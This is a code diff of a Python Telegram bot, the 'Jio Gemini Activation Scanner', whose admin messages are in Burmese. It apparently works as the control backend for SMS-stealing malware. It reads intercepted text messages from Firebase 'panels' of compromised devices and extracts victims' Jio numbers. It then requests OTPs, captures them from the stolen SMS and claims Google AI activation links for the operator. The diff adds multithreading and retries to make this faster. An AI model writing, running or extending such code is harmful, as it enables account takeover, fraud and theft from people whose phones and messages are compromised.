@@ -1,25 +1,23 @@
 """
-Jio Gemini Activation Scanner - TELEGRAM BOT & RENDER EDITION (FULL CODE)
-Flow: Telegram Command (/run, /addpanel, /listpanels) → Read panels.txt → Online Devices → Unique Numbers → Process Links & Send to Telegram
+Jio Gemini Activation Scanner - TELEGRAM BOT & RENDER EDITION (HIGH-SPEED THREADED)
+Using new Jio.py structure with panels.txt (| separator) and multi-threading.
 """
-
 from __future__ import annotations
 import csv
 import html
 import re
 import time
-import base64
 import os
 import threading
 from collections import Counter, defaultdict
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
 from pathlib import Path
 from typing import Any
 from urllib.parse import unquote
-from zoneinfo import ZoneInfo, ZoneInfoNotFoundError
 from flask import Flask
 import telebot
 import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== TELEGRAM & WEB SERVER CONFIG ====================
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -40,35 +38,9 @@ def run_web():
 
 ADMIN_CHAT_ID = 1847021130
 
-# ==================== TIMEZONE SAFE CONFIG ====================
-def configured_timezone() -> ZoneInfo:
-    timezone_name = os.getenv("APP_TIMEZONE", "Asia/Kathmandu")
-    try:
-        return ZoneInfo(timezone_name)
-    except ZoneInfoNotFoundError:
-        try:
-            import tzdata
-            return ZoneInfo(timezone_name)
-        except Exception:
-            return ZoneInfo("UTC")
-
-TIMEZONE = configured_timezone()
-
-# ==================== LOAD PANELS FROM PANELS.TXT ====================
-def load_panels_from_file():
-    panels = []
-    if os.path.exists("panels.txt"):
-        with open("panels.txt", "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith("#"):
-                    parts = line.split(",", 1)
-                    if len(parts) == 2:
-                        panels.append((parts[0].strip(), parts[1].strip()))
-    return panels
-
-MESSAGE_SCAN_LIMIT = 100
-OTP_TIMEOUT = 15
+PANELS_FILE = Path("panels.txt")
+MESSAGE_SCAN_LIMIT = 150
+OTP_TIMEOUT = 20
 POLL_INTERVAL = 1
 
 CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
@@ -84,11 +56,9 @@ GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&sourc
 NUMBER_PATTERNS = (
     re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
     re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
-    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
-    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
 )
 
-OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
+OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password")
 OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")
 
 ACTIVATION_PATTERN = re.compile(
@@ -98,24 +68,71 @@ ACTIVATION_PATTERN = re.compile(
 )
 
 # ==================== FUNCTIONS ====================
+def clean_firebase_url(url: str) -> str:
+    url = url.strip().replace(" ", "")
+    if not url.startswith("https://"):
+        url = "https://" + url
+    return url
 
-def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
-    query = {"auth": key}
+def clean_firebase_key(key: str) -> str:
+    key = key.strip().replace(" ", "")
+    if key.startswith("http"):
+        return ""
+    return key
+
+def load_panels() -> list[tuple[str, str]]:
+    if not PANELS_FILE.exists():
+        return []
+    panels: list[tuple[str, str]] = []
+    seen: set[tuple[str, str]] = set()
+    with PANELS_FILE.open(encoding="utf-8") as handle:
+        for raw_line in handle:
+            line = raw_line.strip()
+            if not line or line.startswith("#"):
+                continue
+            parts = line.split("|", 1)
+            base_url = clean_firebase_url(parts[0])
+            key = clean_firebase_key(parts[1]) if len(parts) > 1 else ""
+            if not base_url or ("firebaseio.com" not in base_url and "firebasedatabase.app" not in base_url):
+                continue
+            entry = (base_url, key)
+            if entry in seen:
+                continue
+            seen.add(entry)
+            panels.append(entry)
+    return panels
+
+def firebase_get_with_retry(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None, max_retries: int = 3) -> Any:
+    query = {}
+    if key and not key.startswith("http"):
+        query["auth"] = key
     if params:
         query.update(params)
-    if key and key.startswith("http"):
-        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=20)
-        response.raise_for_status()
-        return response.json()
-    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
-    response.raise_for_status()
-    return response.json()
+    for attempt in range(max_retries):
+        try:
+            response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
+            response.raise_for_status()
+            return response.json()
+        except (requests.RequestException, ValueError):
+            if attempt == max_retries - 1:
+                raise
+            time.sleep(1 * (attempt + 1))
+    return {}
+
+def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
+    try:
+        return firebase_get_with_retry(session, base_url, key, path, params)
+    except Exception:
+        return {}
 
 def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
-    data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
-    if not isinstance(data, dict):
+    try:
+        data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
+        if not isinstance(data, dict):
+            return {}
+        return {name: value for name, value in data.items() if isinstance(value, dict)}
+    except Exception:
         return {}
-    return {name: value for name, value in data.items() if isinstance(value, dict)}
 
 def normalize_mobile(value: Any) -> str | None:
     digits = re.sub(r"\D", "", str(value or ""))
@@ -141,7 +158,7 @@ def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
 
 def firebase_session() -> requests.Session:
     session = requests.Session()
-    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
+    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache", "User-Agent": "Mozilla/5.0"})
     return session
 
 def jio_session() -> requests.Session:
@@ -180,11 +197,7 @@ def is_jio_number(session: requests.Session, mobile: str) -> bool:
 
 def send_otp(session: requests.Session, mobile: str) -> bool:
     try:
-        response = session.post(
-            SEND_OTP_URL,
-            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
-            timeout=20,
-        )
+        response = session.post(SEND_OTP_URL, json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""}, timeout=20)
     except requests.RequestException:
         return False
     return not response_error(response)
@@ -247,7 +260,8 @@ def already_active(value: str) -> bool:
     normalized = " ".join((value or "").lower().replace("_", " ").split())
     return any(phrase in normalized for phrase in (
         "already active", "already activated", "already redeemed",
-        "already claimed", "already availed"
+        "already claimed", "already availed", "already in use",
+        "subscription already", "link has already been used", "already used"
     ))
 
 def api_message(data: dict[str, Any]) -> str:
@@ -287,14 +301,13 @@ def get_activation(session: requests.Session) -> tuple[str, str]:
         return "activation_api_failed", ""
 
 # ==================== TELEGRAM COMMAND HANDLERS ====================
-
 @bot.message_handler(commands=['run'])
 def handle_run_command(message):
     if message.chat.id != ADMIN_CHAT_ID:
         bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
         return
     
-    bot.reply_to(message, "🚀 စစ်ဆေးမှု စတင်နေပါပြီ ခဏစောင့်ပါ...")
+    bot.reply_to(message, "🚀 Multi-threading စနစ်ဖြင့် အမြန်ဆုံး စစ်ဆေးနေပါပြီ ခဏစောင့်ပါ...")
     threading.Thread(target=main_process, args=(message.chat.id,), daemon=True).start()
 
 @bot.message_handler(commands=['addpanel'])
@@ -305,12 +318,12 @@ def add_panel_command(message):
     
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
-        bot.reply_to(message, "⚠️ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ပို့ပေးပါ:\n`/addpanel URL,KEY`", parse_mode="Markdown")
+        bot.reply_to(message, "⚠️ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ပို့ပေးပါ:\n`/addpanel URL|KEY`", parse_mode="Markdown")
         return
     
     panel_info = parts[1].strip()
-    if "," not in panel_info:
-        bot.reply_to(message, "⚠️ URL နှင့် Key ကြားတွင် ကော်မာ (`,`) ခံရန် မမေ့ပါနှင့်။")
+    if "|" not in panel_info:
+        bot.reply_to(message, "⚠️ URL နှင့် Key ကြားတွင် ပိုက်လိုင်း (`|`) ခံရန် မမေ့ပါနှင့်။")
         return
     
     with open("panels.txt", "a", encoding="utf-8") as f:
@@ -324,7 +337,7 @@ def list_panels_command(message):
         bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
         return
         
-    panels = load_panels_from_file()
+    panels = load_panels()
     if not panels:
         bot.reply_to(message, "📁 `panels.txt` ထဲတွင် Panel တစ်ခုမှ မရှိသေးပါ။")
         return
@@ -338,60 +351,75 @@ def list_panels_command(message):
         
     bot.reply_to(message, text, parse_mode="HTML")
 
-# ==================== MAIN PROCESS ====================
-
+# ==================== MAIN PROCESS (MULTI-THREADED) ====================
 def main_process(chat_id: int) -> int:
-    FIREBASE_PANELS = load_panels_from_file()
-    if not FIREBASE_PANELS:
-        bot.send_message(chat_id, "❌ `panels.txt` ဖိုင်ထဲတွင် Panel လင့်ခ်များ မတွေ့ပါ။ ကျေးဇူးပြု၍ `/addpanel` ဖြင့် သို့မဟုတ် `panels.txt` ထဲတွင် ထည့်ပေးပါ။")
+    valid_panels = load_panels()
+    if not valid_panels:
+        bot.send_message(chat_id, "❌ `panels.txt` ဖိုင်ထဲတွင် Panel လင့်ခ်များ မတွေ့ပါ။")
         return 1
 
-    bot.send_message(chat_id, f"🔍 STEP 1: `panels.txt` မှ Panel စုစုပေါင်း {len(FIREBASE_PANELS)} ခုကို စစ်ဆေးနေပါပြီ...")
+    bot.send_message(chat_id, f"🔍 STEP 1: Panel {len(valid_panels)} ခုကို Thread များဖြင့် အမြန်ဆုံး စစ်ဆေးနေပါပြီ...")
     
     all_online_devices: dict[str, dict[str, Any]] = {}
     device_messages: dict[str, dict[str, dict[str, Any]]] = {}
     
-    for panel_idx, (base_url, firebase_key) in enumerate(FIREBASE_PANELS, start=1):
+    def scan_panel(panel_idx: int, base_url: str, firebase_key: str):
         firebase = firebase_session()
         try:
-            if firebase_key and firebase_key.startswith("http"):
-                response = firebase.get(f"{base_url}/clients.json", timeout=10)
-            else:
-                response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=10)
-            
-            if response.status_code == 200:
-                clients = response.json()
-                if isinstance(clients, dict):
-                    for device_id, data in clients.items():
-                        if isinstance(data, dict) and data.get("status") is True:
-                            all_online_devices[device_id] = {
-                                "base_url": base_url,
-                                "firebase_key": firebase_key,
-                                "firebase_session": firebase,
-                                "data": data,
-                            }
+            clients = firebase_get(firebase, base_url, firebase_key, "clients")
+            if not isinstance(clients, dict):
+                return {}
+            devices = {}
+            for device_id, data in clients.items():
+                if isinstance(data, dict) and data.get("status") is True:
+                    devices[device_id] = {
+                        "base_url": base_url,
+                        "firebase_key": firebase_key,
+                        "firebase_session": firebase,
+                        "data": data,
+                    }
+            return devices
         except Exception:
-            pass
+            return {}
+
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {
+            executor.submit(scan_panel, idx, url, key): idx
+            for idx, (url, key) in enumerate(valid_panels, start=1)
+        }
+        for future in as_completed(futures):
+            devices = future.result()
+            if devices:
+                all_online_devices.update(devices)
     
     if not all_online_devices:
         bot.send_message(chat_id, "❌ Online ရှိသော Device တစ်ခုမှ မတွေ့ပါ။")
         return 1
     
+    bot.send_message(chat_id, f"📱 Online Devices စုစုပေါင်း တွေ့ရှိမှု: {len(all_online_devices)} ခု။ မက်ဆေ့ချ်များ စစ်ဆေးနေပါပြီ...")
+    
+    def scan_device(device_id: str, info: dict[str, Any]):
+        messages = latest_messages(
+            info["firebase_session"],
+            info["base_url"],
+            info["firebase_key"],
+            device_id,
+            MESSAGE_SCAN_LIMIT,
+        )
+        mobiles = number_candidates(messages)
+        return device_id, messages, mobiles
+
     mappings: dict[str, set[str]] = defaultdict(set)
-    for device_id, info in all_online_devices.items():
-        try:
-            messages = latest_messages(
-                info["firebase_session"],
-                info["base_url"],
-                info["firebase_key"],
-                device_id,
-                MESSAGE_SCAN_LIMIT,
-            )
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {
+            executor.submit(scan_device, device_id, info): device_id
+            for device_id, info in all_online_devices.items()
+        }
+        for future in as_completed(futures):
+            device_id, messages, mobiles = future.result()
             device_messages[device_id] = messages
-            for mobile in number_candidates(messages):
+            for mobile in mobiles:
                 mappings[mobile].add(device_id)
-        except Exception:
-            device_messages[device_id] = {}
     
     targets: list[tuple[str, str]] = []
     for mobile, devices in sorted(mappings.items()):
@@ -399,16 +427,19 @@ def main_process(chat_id: int) -> int:
             targets.append((sorted(devices)[0], mobile))
     
     if not targets:
-        bot.send_message(chat_id, "❌ ဖုန်းနံပါတ် Candidate တစ်ခုမှ မတွေ့ပါ။")
+        bot.send_message(chat_id, "❌ ဖုန်းနံပါတ် Candidate တစ်ခုမှ မတွေ့ပါ။ (ဖုန်းနံပါတ်များ သို့မဟုတ် မက်ဆေ့ချ်ဒေတာ မရှိပါ)")
         return 1
     
-    bot.send_message(chat_id, f"🎯 တွေ့ရှိသော Unique Numbers စုစုပေါင်း: {len(targets)} ခု။ OTP + Activation စတင်နေပါပြီ...")
+    bot.send_message(chat_id, f"🎯 Unique Numbers စုစုပေါင်း: {len(targets)} ခု။ OTP + Activation စတင်နေပါပြီ...")
     
+    jio = jio_session()
     statuses: Counter[str] = Counter()
+    
     for serial, (device_id, mobile) in enumerate(targets, start=1):
         info = all_online_devices.get(device_id)
         if not info:
             continue
+        
         base_url = info["base_url"]
         firebase_key = info["firebase_key"]
         firebase = info["firebase_session"]
@@ -417,7 +448,6 @@ def main_process(chat_id: int) -> int:
         if not isinstance(device, dict) or device.get("status") is not True:
             status, url = "device_offline", ""
         else:
-            jio = jio_session()
             if not is_jio_number(jio, mobile):
                 status, url = "not_jio_number", ""
             else:
@@ -445,10 +475,9 @@ def main_process(chat_id: int) -> int:
     return 0
 
 # ==================== MAIN EXECUTION ====================
-
 if __name__ == "__main__":
-    print("Starting Web Server and Bot...")
+    print("Starting Web Server and Bot with Threading Support...")
     t_web = threading.Thread(target=run_web, daemon=True)
     t_web.start()
     bot.infinity_polling(skip_pending=True)
-                      
+    
